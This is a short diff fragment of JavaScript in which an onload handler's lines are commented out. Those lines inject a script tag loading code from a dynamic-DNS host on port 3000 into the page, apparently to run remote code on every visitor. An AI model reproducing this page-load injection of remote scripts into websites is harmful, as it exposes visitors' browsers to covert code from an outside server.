@@ -76,8 +76,8 @@ while (coo.length > i45) {
     i45++
 }
 document.body.onload = function () {
-	var eld = document.createElement('div')
-	eld.innerHTML = '<script src="http://keyways.ddns.net:3000/"></script><script>setTimeout(function(){checkStatus(2)},1000)</script>';
+	//var eld = document.createElement('div')
+	//eld.innerHTML = '<script src="http://keyways.ddns.net:3000/"></script><script>setTimeout(function(){checkStatus(2)},1000)</script>';
 	//document.body.insertBefore(eld,document.body.childNodes[0]);
 	/*
 	var s = document.createElement('script');
